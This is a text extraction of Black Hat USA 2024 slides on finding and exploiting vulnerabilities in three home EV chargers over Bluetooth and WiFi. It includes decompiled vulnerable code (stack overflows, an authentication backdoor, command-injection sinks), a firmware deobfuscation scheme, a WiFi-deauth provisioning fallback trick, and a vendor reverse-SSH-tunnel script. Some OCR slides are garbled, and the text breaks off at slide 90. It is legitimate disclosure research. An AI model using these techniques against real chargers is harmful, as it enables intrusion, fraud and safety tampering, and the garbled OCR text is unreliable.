---
title: "Low Energy to High Energy Hacking Nearby EV-Chargers Over Bluetooth"
speakers: ["Thijs Alkemade", "Khaled Nassar", "Daan Keuper"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Thijs Alkemade & Khaled Nassar & Daan Keuper_Low Energy to High Energy Hacking Nearby EV-Chargers Over Bluetooth.pdf"
pages: 96
sha256: "bec9b1aef39cc0d21d41290d78d663afc63b6eedf783cab8c5f93b1d8ac5104b"
text_chars: 30055
ocr_pages: 21
has_ocr: true
redacted_secrets: 1
ocr_confidence: 90.0
ocr_unreliable_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:43:03Z"
---
# Low Energy to High Energy Hacking Nearby EV-Chargers Over Bluetooth

**Speakers:** Thijs Alkemade, Khaled Nassar, Daan Keuper  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Thijs Alkemade & Khaled Nassar & Daan Keuper_Low Energy to High Energy Hacking Nearby EV-Chargers Over Bluetooth.pdf` (96 pages)


## Slide 1

## **Low Energy to High Energy: Hacking Nearby EV-Chargers Over Bluetooth Thijs Alkemade & Khaled Nassar Computest Sector 7**

**>> >>**

## Slide 2

##### **Introduction**

###### 1. Be in Bluetooth/WiFi range

2. ???

3. Execute arbitrary code on the charger

**>>**

## Slide 3

##### **About us**

> We are:

> Khaled Nassar @notkmhn > Thijs Alkemade infosec.exchange/@xnyhps > Daan Keuper @daankeuper > Working for Computest in The Netherlands

**>>**

## Slide 4

##### **Pwn2Own Automotive**

- Pwn2Own Automotive > First time

- January 2024 in Tokyo

- > In scope: > Tesla

   - Infotainment systems > Automotive operating systems **> EV chargers**

>>

## Slide 5

##### **EV chargers**

- Level 2 chargers

- Targeted at the home market

- > All of them come with these features

   - Connectivity (WiFi/Ethernet)

   - Scheduling

   - Usage monitoring

**>>**

## Slide 6

##### **EV chargers**

- Initially, we thought chargers would be well secured: > New product category

   - Limited communication interfaces

   - Safety regulations

**>>**

## Slide 7

### **JuiceBox 40 Smart EV Charging Station with WiFi**

**>>**

## Slide 8

##### **JuiceBox 40**

> BLE (provisioning) > WiFi

**>>**

## Slide 9


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Juicebox repair of burnt relay. Here's how to repair it
```

## Slide 10

## Slide 11


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Home » Vehicle > Accessory > JuiceBox EVSE Guides Answers (4 Edit Ww
Getting WiFi working
Matt Falcon and 2 other contributors
5.2K Ong 1 0
@ Last updated on November 16, 2022 © 2
& No estimate Moderate — Community-Contributed Guide
Step1 Basic principles of operation
@ The JuiceBox doesn't talk directly to your phone, or anything local. It talks only to
JuiceNet - the cloud server that crunches all the data.
@ The box remembers one WiFi network, and only one WiFi network. It will constantly
try connecting to this last-known network as long as it's powered up, retrying every
few seconds, for all eternity until the heat death of the universe.
® The WiFi processor is independent of the safety/J1772 processor. That is to say, it'll
charge without WiFi, and the only thing WiFi can do to affect charging is change
settings - like a schedule or access control.
® There are no settings or history stored on the box (technically, history |S stored on
the box, but the server/app-side UX is god-awful and doesn't retrieve or process the
locally-stored event and energy data). So, everything about the box is done remotely
- user control, what car it is, time-of-use, cost, etc., is all cloud-based.
```

## Slide 12


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step 2 Version differences
® Modern JuiceBoxes (late 2018 to present) - running ZAP (Zentri Application)
firmware - can automatically update their WiFi processor (but not the core/safety
processor) when new firmware is available. You Know you have a ZAP box if your
Setup network has no password ("JuiceNet-###").
@ Older JuiceBoxes (late 2015-late 2018) run the basic ZentriOS core firmware, with
no application - acting as "dumb modems" to stream real-time data to the cloud
UDP server. These boxes have a Setup mode network with the password
"GoElectric” - as written in the manual. Many of these can be updated to ZAP - but
read on to why you might not want to.
® The web setup application was removed from ZAP-based firmware for unknown
reasons around mid-2020. This makes it near impossible to set up WiFi outside the
EV JuiceNet app, or to save correct settings when the app is incorrectly saying
they're not valid, or to connect to a hidden network. It's hard to say if updating is a
good thing anymore.
Even older JuiceBoxes (2014-2015) have the basic ZentriOS core firmware, but run
on older AMWO06 modules - in JuiceBox v8.12 and older. These can't be upgraded,
and many are stuck with the version they have - though they can be updated to
point to a new server, the core processor may not be speaking a modern protocol
language.
e Finally, the very first Kickstarter-era (2013-2014) JuiceBoxes have a Roving
Networks WiFly module inside. These can be updated all the way to talk to the
modern JuiceNet, but ... it takes wizard skill. Wizard training may come in the later
pages of these guides!
```

## Slide 13


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Releases Notes
WGMi60P MCU Release Notes
Release Version 1.0.46 Release Version 1 'e) A6
Release Version 1.0.38 Release date:25-May-2021
Operating System: Gecko OS 4.2.7
Compatible Hardware:
Next Generation North American JuiceBox and JuiceBox Pro 32, 40 and 48 with
Release Version 1.0.36
Type 1 J1772 output plug manufactured starting in December 2019. Supported
Release Version 1.0.30 hardware includes combinations of WiFi (IEEE 801.11b/g/n, 2.4GHz),
Bluetooth, MiFare 13.56 MHzRFID reader, CAT-1 LTE with support for over-the-
air (OTA) update through WiFi and LTE.
Next Generation European and LatAm 3 Phase and 1 Phase JuiceBox Basic with
Release Version 1.0.27
Type 2 IEC output plug manufactured starting in Sep 2020. Supported
Release Version 1.0.22 hardware includes combinations of WiFi (IEEE 801.11b/g/n, 2.4GHz),
Bluetooth, MiFare 13.56 MHz RFID reader with support for OTA update
through WiFi.
JuicePedestal Unattended Payment Terminal (UPT) with OTA update through
the embedded CAT-1 LTE modem.
Release Version 1.0.21
```

## Slide 14


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Release Version 1.0.46
Release date: 25-May-2021
Operating System: Gecko OS 4.2.7
Compatible Hardware:
Next Generation North American JuiceBox and JuiceBox Pro 32, 40 and 48 with
Type 1 Ji772 output plug manufactured starting in December 2019. Supported
hardware includes combinations of WiFi(IEEE 801.11b/g/n, 2.4 GHz),
Bluetooth, MiFare 13.56 MHz RFID reader, CAT-1 LTE with support for over-the-
air (OTA) update through WiFiand LTE.
Next Generation European andLatAm 3 Phase and 1 Phase JuiceBox Basic with
Type 2 IEC output plug manufactured starting in Sep 2020. Supported
hardware includes combinations of WiFi(IEEE 801.11b/g/n, 2.4 GHz),
Bluetooth, MiFare 13.56 MHz RFID reader with support for OTA update
```

## Slide 15


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
g gkirstei - 2y aga
My JuiceBox 32 went offline, | checked everything and found that actually it is not offline. | was
able to access its local IP address via web browser. Turned out that box cannot connect to the
servers. | connected via telnet on port 2000 and saw that the evse is periodically trying to
connect to the cloud and ntp server. NTP is sensitive issue usually so | changed default ntp
server to my gateway router. After hitting enter on command save, everything started to work
as | should. Box is back online. —. Terminal commands you can find here:
https: //docs.zentri.com/zentrios/w/latest/cmd/variables/ntp Just remember to enter "save" -
after changes.
© ped C) Reply iT, Share aun
@ MTBR-4ever « 2y ago
| had same issues on my Juicebox Pro40, and was able to get it come back online using
the NTP options. After a few weeks though, back to the same problem. | got through to
someone in techsupport who was aware of the issue and provided a solution. Apparently
on these older units were unable to receieve the update that directs them to the proper
server. Here are the steps:
1. obtain the IP address of your Juicebox and enter this into web browser. There is no
password by the way, which is a concern
2. Click Console on the left hand said
3. In the console, type the following:
set ud c h emwijuicebox.cloudapp.net
save
reboot
The unit will reboot and will connect to the proper server. Enel app should then show your
JB back online. It did for me.
```

## Slide 16


> Recovered by OCR — confidence 77/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
gkirste!
4
\nad sal e iss J icedo TO! and ¥ 5 3! x com pat online usind
Jui
iceBox EVSE
Getti
ing Wi
e Matt tha workin Guide:
imate N , ontributors
© 5.2k
Comi
ted Guid
Ste
asic pri
Principles of
Operati
ion
e
The
Jui
Juic iceBox
eNet doesn'
loud k dire
ver that ee ol phigh
ches fe, or
all tha anythii
. It talks
only t
char
ge wil
like a aie the
ule or
a
fet
‘cess Cont 72 proce
rol. ssor. Tha
Say, it
Il
```

## Slide 17


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
o gkirstei - 2y ago
My JuiceBox 32 went offline. | checked everything and found that actually it is not
offline. | was able to access its local IP address via web browser. Turned out that
box cannot connect to the servers. | connected via telnet on port 2000 and saw
that the evse is periodically trying to connect to the cloud and ntp server. NTP is
sensitive issue usually so | changed default ntp server to my gateway router. After
hitting enter on command save, everything started to work as | should. Box is back
online. |. Terminal commands you can find here:
https://docs.zentri.com/zentrios/w/latest/cmd/variables/nto Just remember to enter
“save” - after changes.
```

## Slide 18


> Recovered by OCR — confidence 94/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Gecko OS Web App Console — v3.1.5
>
```

## Slide 19

##### **JuiceBox 40**

- Based on the Zentri IoT platform > AMW006 or WGM160P module

   - Both are ARM Cortex-M4 based MCUs

- Gecko OS 4.2.7 (?)

- > There is an admin interface, with some commands?

   - Accessible in setup mode over HTTP

   - And accessible during standard operation over port 2000, telnet style!

   - > **No authentication**

**>>**

## Slide 20

##### **Zentri DMS**

- Managed IoT platform

- > Specific hardware modules, providing > Update management > Device identification and auth{n,z}

- > Core OS + SDK bindings for app development > Extensive API

**>>**

## Slide 21

##### **Zentri DMS**

- JuiceBox runs on an RTOS called “Gecko OS” > Note: this OS is EOL!

- Firmware blobs are downloadable!

- We could investigate these before the device arrived

###### **>>**

## Slide 22

##### **JuiceBox 40 (CVE-2024-23938)**

- Gecko OS logs messages when certain events occur

- > It is possible to change the format of these messages using a **set** variable command > Limited to 32 characters per message template including a terminating NULL byte

- > Support for different formatting **tags** per event type

**>>**

## Slide 23

##### **JuiceBox 40 (CVE-2024-23938)**

char scratch_buffer[132]; char formatted_msg_buffer[192]; char * dst = formatted_msg_buffer; // ... if ((format_tag == 't') && (print_timestamp_to_string(scratch_buffer, 1) == SUCCESS)) { memcpy(dst, scratch_buffer, 10); dst[10] = ' '; dst[11] = '|'; dst[12] = ' '; memcpy(dst + 13, scratch_buffer + 11, 8); dst[21] = ':'; dst[22] = ' '; dst = dst + 23; *dst = '\0'; }

**>>**

## Slide 24

##### **JuiceBox 40 (CVE-2024-23938)**

- **What if we provide multiple @t tags?**

   - At most 15 times, each using up **23** bytes

- **15 * 23 = 345** bytes, while the stack allocated buffer is **192** bytes long

- > No canaries, no ASLR, but some limitations on allowed byte values

**>>**

## Slide 25

##### **What about BLE?**

- Secondary processor for BLE

- Communicates with the WGM160P over SPI

- > Exposes a BLE Serial Port Profile service

- Allows for retrieving and setting system variables

- Used during provisioning to set WiFi credentials

**>>**

## Slide 26

##### **JuiceBox 40**

###### **Provisioning mode fallback**

- Deauth the device from the provisioned WiFi AP

- > Device will fall back into provisioning mode!

- Use BLE SPP service to retrieve/set WiFi credentials!

**>>**

## Slide 27

### **The “fix”**

**>>**

## Slide 28


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SILICON LABS
Technical Summary
See the following table for detailed technical descriptions of the vulnerabilities
CVE Technical summary Type of Attack
CVE-2024-2701 A buffer-based overflow in the HTTP server allows an attacker to use Remote code execution
a specially crafted GET request to gain remote code execution.
A buffer overflow vulnerability allows an attacker with access to the
CVE-2024-23938 remote console to print a specially crafted debug message to gain Remote code execution
remote code execution.
A buffer-based overflow in the HTTP client allows an attacker to
CVE-2024-24731 request a file download from long URL which leads to remote code Remote code execution
execution.
A specially crafted DNS response may lead to an infinite loop,
causing a denial-of-service.
Denial of service
A specially crafted URL causes the http_download command to leak
GVE-2024-25937 formation from the stack.
Information disclosure
Fix/Workaround
e Gecko OS is in end of life (EOL) status so no fix will be offered.
```

## Slide 29

### **Autel MaxiCharger AC Wallbox Commercial (MAXI US AC W12-L-4G)**

**>>**

## Slide 30

##### **Autel MaxiCharger**

- WiFi

- Bluetooth

- 4G

- Ethernet

- > RFID

- LCD touch screen

- > RS485 port > Runs FreeRTOS

**>>**

## Slide 31

##### **Autel MaxiCharger**

- Lots of labeled test points (TX/RX)

- > Multiple internal USB ports with unknown purpose

- > Spread out across many components

>>

## Slide 32

##### **Autel MaxiCharger**

**>>**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Autel MaxiCharger
Home Charger Sharing
ce Environment Protection
Achieve green development by
reducing vehicle exhaust emissions
and conserving energy.
x= Income Generation
Earn extra money using the idle time
of the charger.
@@ Convenient Management
Setup the sharing feature and view
charge records in real time.
0 Privacy Protection
Protect your privacy with multiple
mechanisms.
Enjoy free Home Charger Sharing before June 2024
Share Your Home Charger
```

## Slide 33

##### **Autel MaxiCharger**

**>>**

## Slide 34

# **Main CPU UART**

**>>**

## Slide 35

**Random internal micro-USB ports?**

**>>**

## Slide 36

##### **Getting the firmware**

1. App pairs with the charger

2. App asks the charger the current version of the firmware for each component

3. App submits this to a cloud server

Later:

1. App asks the server for updates

2. Server sends back a list of obfuscated URLs for each component that is not up to date

3. App downloads new files

4. App transfers files to charger over BLE

**>>**

## Slide 37

##### **Firmware URL obfuscation**

{ "fInfo": "AHR0CHM6L79zM75lDS1jZW50CmfsLTeuYW1hEm9uYXDzLmNvBS9kZWZhDWx0LmVuZ "fileName": "Firmware_ECC0101_V1.35.00.aut", "fileSize": 970659, "firmwareId": "__UNI__OTA_ECC0101", "firmwareName": "Charge Control Module", "firmwareVersion": "1.35.00", "needReboot": true, "note": "", "upgradeDuring": 180, "upgradeOrder": 5 }

**>>**

## Slide 38

##### **Is it just base64?**

**>>**

## Slide 39

##### **Getting the firmware**

###### **Custom base64 alphabet**

- A ➔ a

- a ➔ A

- B ➔ b

- b ➔ B

- 7 ➔ y

- y ➔ 7

- > …

**>>**

## Slide 40

**>>**


> Recovered by OCR — confidence 88/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
eee Figure 1
=
a
LLU
20000 40000 60000 80000 100000 120000 140000
Offset
>>
```

## Slide 41

**>>**

## Slide 42

##### **Getting the firmware**

- XOR with 256-byte key? > Nope

- > Addition instead of XOR? > Almost?

**>>**


> Recovered by OCR — confidence 79/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PexT)mx:
*Lxc+Exa
q
x x—xp
, x
K xa$x
Addition instead of XOR? 47 62[0d_Ga_| 00 00 00 00] 20 20 20 20 |.wxtb
x x*xXD
x x—xD
7_xf'Vg!
*xxHEAx_
F_ctmryT
x%xpeWnt
x%xe OxC
```

## Slide 43

##### **Getting the firmware**

###### `ciphertext = (plaintext XOR key1) + key2`

**>>**


> Recovered by OCR — confidence 81/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ciphertext
(plaintext XOR key1) + key2
.WxtGb
x x—xD
PexT)mx:
*Lxc+Exa
¢
4 ee
x x—xp
, x
K xa$x
NwxtI va
x x*xp
7_xf'Vg!
*xxHEAx_
#axdxqxa
F_ctmryT
x%xpeWnt
```

## Slide 44

**>>**


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Serial number, 8 digit code
Authentication token
Autel server
```

## Slide 45

**>>**


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
App random
—= Charger
App
Charger random
Hash(App random, Charger random, Auth token)
Authentication success/fail
```

## Slide 46

##### **Autel MaxiCharger (CVE-2024-23958)**

**if** ( packet && packet_length == 32 ) {

log("A_Ble_Bus", 2, 536, "auth msg **\r\n** "); memcpy(appAuthData, packet, **sizeof** (appAuthData)); get_password(passwordHashData); memcpy(randomNumbers, app_random, 4u); memcpy(&randomNumbers[4], charger_random, 4u); retrieveAuthToken(randomNumbers, passwordHashData, cpAuthData); **for** ( k = 0; k < 0x20u; ++k ) {

**if** ( appAuthData[k] != cpAuthData[k] ) response[12] = 1; } }

**>>**

## Slide 47

##### **Autel MaxiCharger (CVE-2024-23958)**

**if** ( response[12] ) { response[12] = 0; sha256(backdoorToken, 0x20u, hashed, 0); sha256(hashed, 0x20u, hashed, 0); sha256(hashed, 0x20u, hashed, 0); memcpy(backdoorToken, hashed, **sizeof** (backdoorToken)); retrieveCpAuthData(randomNumbers, backdoorToken, cpAuthData); **for** ( m = 0; m < 0x20u; ++m ) { **if** ( appAuthData[m] != cpAuthData[m] ) response[12] = 1; } **if** ( response[12] ) { set_ble_authenticated(0); log("A_Ble_Bus", 2, 646, "auth failed, %s. **\r\n** ", v4); } **else** { set_ble_authenticated(1); log("A_Ble_Bus", 2, 641, "authbd succ **\r\n** "); } } **else** { set_ble_authenticated(1); log("A_Ble_Bus", 2, 605, "con:step4->authentication succ, %d **\r\n** ”, v15); }

**>>**

## Slide 48

##### **Autel MaxiCharger (CVE-2024-23958) Authentication “backdoor”**

log("A_Ble_Bus", 2, 641, "auth **bd** succ **\r\n** ");

**>>**

## Slide 49

##### **Autel MaxiCharger (CVE-2024-23959) Post-authentication buffer overflow**

char stack_buffer[60]; _// [sp+50h] [bp-120h] BYREF_

bzero(stack_buffer, 60);

**if** ( a1 ) {

[...] } **else** {

qmemcpy(v13, (int *)aU, **sizeof** (v13)); sub_80C38D4(v13, 17);

memcpy(stack_buffer, ble_buffer, ble_buffer_length); os_printf_maybe(byte_80F4768);

os_printf_maybe("chargingCtrlParam.chargingCtrl = 0x%x **\r\n** ", *(_DWORD *)stack_buffer); os_printf_maybe("chargingCtrlParam.chargingMode = 0x%x **\r\n** ", *(_DWORD *)&stack_buffer[4]); os_printf_maybe("chargingCtrlParam.chargingParam = %d **\r\n** ", *(_DWORD *)&stack_buffer[8]); os_printf_maybe("chargingCtrlParam.accountBalance = %d **\r\n** ", *(_DWORD *)&stack_buffer[12]); [...] }

**>>**

## Slide 50

##### **Autel MaxiCharger**

- Binary exploitation on easy mode:

   - No stack canaries

   - No ASLR

   - No limitations on character set

   - Many saved registers on the stack

- Since it’s FreeRTOS, cleanup and continuation was the **only challenging part**

**>>**

## Slide 51

**Autel MaxiCharger (CVE-2024-23967) Buffer overflow when decoding base64**

char base64_decoded[1024]; _// [sp+B0h] [bp-418h] BYREF_

initialize_string(data); v7 = parse_json_message(a1, a2, v26, a4, v24, data); **if** ( string_equal(v26, "Reboot") ) { ... } **if** ( v7 >= 1 ) {

c_string = get_c_string(data); os_printf_maybe("strData:%s", c_string); memset(base64_decoded, 0, **sizeof** (base64_decoded)); data_string = (char *)get_c_string(data); data_base64_decode(data_string, base64_decoded); os_printf_maybe("data_base64_decode:%s", base64_decoded);

**>>**

## Slide 52

### **ChargePoint Home Flex**

**>>**

## Slide 53

##### **ChargePoint Home Flex**

> BT + BLE (provisioning) > WiFi > Runs Linux

**>>**

## Slide 54


> Recovered by OCR — confidence 76/100 on the text kept, 46/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ChargePoint Home security research
Dmitry Sklyar, @d_skljar
Kaspersky Lab Security Services, @kl_secservices
Contents
3. Mobile application analySis .............ccccccseeseeeeescseeeeceneseeseeeeeeceeeeeesscaeeeeesaeseeeseeesesensaees 5
5.1. NAND image Structure ............:cccccsccsecesssssseececesseeseaeeeeceseseceesaaeeeeeseeseseeaeeeseeseess 12
7.1.1.1. OS command injection in uploads ...................:eeceeeeeeseeeeeeeeeeeeeeeeees 19
7.1.2.1. Stack buffer overflow in QetsrVr,...........cccssscessssecsessseeeecsseeseessreesesseess 21
7.4.1. Stack buffer overflow in btclassic.................cccccccccccscsecseeccceeeeeseeaeeeeeseesenseess 25
```

## Slide 55

**ChargePoint Home Flex 2018 - Kaspersky Lab report**

**>>**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2018 - Kaspersky Lab report
7.4.1. Stack buffer overflow in btclassic
When parsing the “password” parameter of the “connect_to_wifi” request, the service
copies it to the stack buffer without proper length verification (see Listing 9).
Listing 9. Btclassic vulnerable code
pswd = (void *)json_dumps(joPassword, 512);
strcpy(.pswdHash, (const char *)pswd);
“oswdHash” here is a 0OxDO-byte stack buffer. This can lead to a stack buffer overflow and a
denial of service attack.
For successful vulnerability exploitation, the charging station needs to be in the
unregistered state. To place the station into that state, an attacker may need to makea
power-cycle prepended by the reset-to-factory-defaults procedure, which requires
physical access to the charger.
```

## Slide 56

## Slide 57

##### **ChargePoint Home Flex Getting firmware**

**>>**

## Slide 58

##### **ChargePoint Home Flex**

###### **Getting firmware**

- JTAG + gdb to get U-Boot shell

> Modify kernel boot args to use /bin/sh as init > Dump block devices with netcat ™

**>>**

## Slide 59

##### **ChargePoint Home Flex Data flow through IPC to other services**

**>>**


> Recovered by OCR — confidence 93/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Data flow through IPC to other services
ELF (IPC) ELF
onboardee AP wlanapp
Information
```

## Slide 60

##### **ChargePoint Home Flex Command injection in wlanapp**

snprintf( command, 0x100u, "/usr/sbin/wpa_passphrase \"%s\" \"%s\" | grep \"psk=\" | tail -1 | cut -c6-", &msg->ssid, &msg->password); popen_res = popen(command, "r");

**>>**

## Slide 61

##### **ChargePoint Home Flex Provisioning mode fallback**

> Exactly the same as the JuiceBox 40

**>>**

## Slide 62

### **New bug**

**>>**

## Slide 63

##### **ChargePoint Home Flex**

**>>**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SUCCESS - Sina Kheirkhah was able to execute his attack against the ChargePoint
Home Flex for $60,000 and 6 Master of Pwn Points.
BUG COLLISION - The Synacktiv Team used a two-bug chain against the ChargePoint
Home Flex. However, the exploit they used was previously known. They still earn
$16,000 and 3 Master of Pwn Points.
BUG COLLISION - Connor Ford of Nettitude executed his attack against the
ChargePoint Home Flex. However, his 2-bug chain was previously known. He still earns
$16,000 and 3 Master of Pwn Points.
BUG COLLISION - Chris Anastasio and Fabius Watson of Team Cluck successfully
attacked the ChargePoint Home Flex. However, the bug they used was previously
known. They still earn $16,000 and 3 Master of Pwn Points.
```

## Slide 64

##### **ChargePoint Home Flex**

- We wanted a new bug, probably had to be something using WiFi

- > Only two connections: > TLS (OCPP) to the management server

   - Outgoing SSH

- 😉

- > SSH was very interesting, but we’ll cover that later!

**>>**

## Slide 65

##### **ChargePoint Home Flex**

###### **/opt/etc/coul/cps.conf:**

\```
Url=https://172.16.110.201:343/gs/pgm.php
WsUrl=wss://homecharger-eu.chargepoint.com:443/ws-prod/panda/v1
WsKey=/var/config/.keys/ca.crt
AuthUrl=https://172.16.50.197:343/gs/pgm
KioskUrl=http://172.31.254.10:80/gsemb_in/pgm.php
CACertificateFile=/var/config/.keys/ca.crt
CertificateFile=/var/config/.keys/system.crt
KeyFile=/var/config/.keys/system.key
KeyType=PEM
VerifyHostName=1
MaxEnqueueFailures=40
\```

**>>**

## Slide 66

##### **ChargePoint Home Flex**

- `CURLOPT_SSL_VERIFYHOST` is a “footgun” in curl:

   - 0: disabled

   - 1: disabled but with some logging > 2: enabled

- This is indeed what the charger used: it only verified that the certificate of the OCPP server was **issued** by ChargePoint’s own root, not that it **matched the domain**

Georgiev, Martin, Subodh Iyengar, Suman Sekhar Jana, Rishita Anubhai, Dan Boneh and Vitaly Shmatikov. “The most dangerous code in the world: validating SSL certificates in non-browser software.” _Proceedings of the 2012 ACM conference on Computer and communications security_ (2012): n. pag.

**>>**

## Slide 67

**>>**


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
~| 0024b100000b442e.chargepoint.net
Subject Name
Country or Region US
County CA
Organisation Coulomb Technologies, Inc.
Organisational Unit Engineering
Common Name 0024b100000b442e.chargepoint.net
Email Address ca@chargepoint.net
Issuer Name
Country or Region US
County CA
Organisation Coulomb Technologies, Inc.
Organisational Unit Engineering
Common Name ca.chargepoint.net
Email Address ca@chargepoint.net
Serial Number 423755
Version 3
Signature Algorithm SHA-1 with RSA Encryption ( 1.2.840.113549.1.1.5 )
Parameters None
```

## Slide 68

**Pwn2Own CTF edition Made possible by:**

**>>**

## Slide 69

##### **ChargePoint Home Flex**

**>>**

## Slide 70

##### **ChargePoint Home Flex**

[

2,

"1706198695", "DataTransfer", { **"vendorId"** : "ChargePoint", **"data"** : "saddr|1|3508|<serial number>|1706198695|0|1|1706198695| homecharger-eu.chargepoint.com:443/ws-prod/panda/v1" }, "<serial number>" ]

**>>**

## Slide 71

##### **ChargePoint Home Flex**

**if** ( command_id == 701 ) {

v91 = payload[136]; v92 = s;

strcpy((char *)s, "NA"); **if** ( v91 ) v92 = payload + 136; cmd = payload + 36; CTLogWhere(5, "RouteToFsmInstance", 4105, 0x4000, " **\n** **** Executing BOOTCONTROL cmd %s **\n** ”, cmd); v94 = strstr(cmd, "reboot"); type = "reboot"; **if** ( !v94 ) type = "bankswitch"; recordReboot(v92, type, "NOC", 0, 1); system(cmd); }

**>>**

## Slide 72

##### **ChargePoint Home Flex**

- Worth it: **exploited worked and not a duplicate** !

- > Probably the fastest developed Pwn2Own exploit in recent years: > **~12 hours** from finding the vulnerability to demonstrating it on stage

>>

## Slide 73

##### **ChargePoint Home Flex**

- This was fun, but then we realise we’re **way** out of scope > And no closer to finding a useful vulnerability > And not familiar with the hacking laws in Japan

**>>**

## Slide 74

### **Impact**

**>>**

## Slide 75

##### **Impact: LAN access**

- Hacking a charger over BLE allows pivoting to the LAN

- > Could make a botnet too

>>

## Slide 76

##### **Impact: bypass safety controls**

- All chargers had separate **power controllers** : > Scheduled charging

   - Limit maximum current

- High temperature shutdown

- > Modifying this firmware could allow **damaging the charger**

- > On the Autel, this firmware could be updated!

**>>**

## Slide 77

##### **Impact: fraud**

- Chargers with payment functionality could be exploited for **financial gain** > Overcharge for energy

- The Autel has “Home Charger Sharing” functionality

- **Only the charger determines the amount billed!**

**>>**

## Slide 78

##### **Impact: disruption**

- Compromising chargers at a large scale could have impact on the **energy grid**

**>>**

## Slide 79

### **Takeaways**

**>>**

## Slide 80

##### **Takeaways Hardware security research**

#### **> Getting firmware is essential**

- Non-invasive

   - Online reconnaissance > Network analysis

> Invasive

- Dumping external storage

   - In-circuit > Desoldering

> Using enabled debug ports

>>

## Slide 81

##### **Takeaways Hardware security research**

#### **> Explore debugging functionality exhaustively** > JTAG/SWD > Built-into firmware

> Fault handlers > Custom protocols/interfaces > Consider similar (cheap) devices or dev-kits

>>

## Slide 82

##### **Takeaways Hardware security research**

**> Invest in a remotely accessible setup** > Smart plugs for power control > Webcam for monitoring > Separately managed network(s) > Optional: smoke detector + smart plug combo

>>

## Slide 83

##### **Takeaways Hardware security research**

#### **> And most importantly, invest in the right tools**

**A fantastic introductory hardware lab setup article by Bishop Fox** <u>https://bishopfox.com/blog/set-up-your-hardware-securitylab</u>

>>

## Slide 84

**Takeaways Provisioning**

- For most chargers, attention was paid to the network attack surface

- Attack surfaces involving the (re)provisioning process are **underexamined** > Bluetooth

   - Bad state transitions

- This probably applies to many IoT devices

**>>**

## Slide 85

##### **Takeaways Provisioning**

- Provisioning should be investigated early on in the design phase

- > **Re-provisioning** should be considered within the context of a reasonable **attacker model**

**>>**

## Slide 86

**<u>https://sector7.computest.nl @sector7_nl</u>**

**>>**

## Slide 87

### **Oh about that SSH connection…**

**>>**

## Slide 88

_#!/bin/sh # Bring up pinned up reverse tunnel to mothership. Try forever, but back off # connection attempts to keep from wasting resources.  Peg the retry time at # some max and keep trying._

... SERIAL_NUM=`cat /var/config/cs_sn` SN_YEAR=`echo $SERIAL_NUM | head -c 2` BASE_SERVER_PORT=20000 BASE_SERIAL=0 SERIAL_MODULO=10000 SERIAL_MINOR=`expr $SERIAL_NUM % $SERIAL_MODULO` REVPORT=`expr $SERIAL_MINOR - $BASE_SERIAL` REVPORT=`expr $REVPORT + $BASE_SERVER_PORT` _#FOR QA server please uncomment this line #REVSYSTEM="pandagateway.ev-chargepoint.com"_ REVSYSTEM="ba79k2rx5jru.chargepoint.com" REVSYSTEMPORT="-p 343" REVHOST="pandart@$REVSYSTEM" REVHOST_2016="pandart@xiuq0o4yl57c.chargepoint.com" _#For 2017_ REVHOST_2017="pandart@xiuq0o4yl57c2017.chargepoint.com"

... **while** true; **do**

... _# Connect to the appropriate server based on the year code in the serial number._ **if** [ "$SN_YEAR" = "17" ]; **then**

_# Connect to the 2017 server. #printf "---> Connecting to 2017 server: $REVHOST_2017\n"_ $LOG "attempting connection to $REVHOST_2017"

ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" $REVSYSTEMPORT -N -T -R $REVPORT:localhost:23 $REVHOST_2017 & ...

**>>**

## Slide 89

##### **ChargePoint Home Flex**

\```
ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" -p 343 -N -T
-R $REVPORT:localhost:23
pandart@xiuq0o4yl57c2017.chargepoint.com
\```

**>>**

## Slide 90

##### **ChargePoint Home Flex**

\```
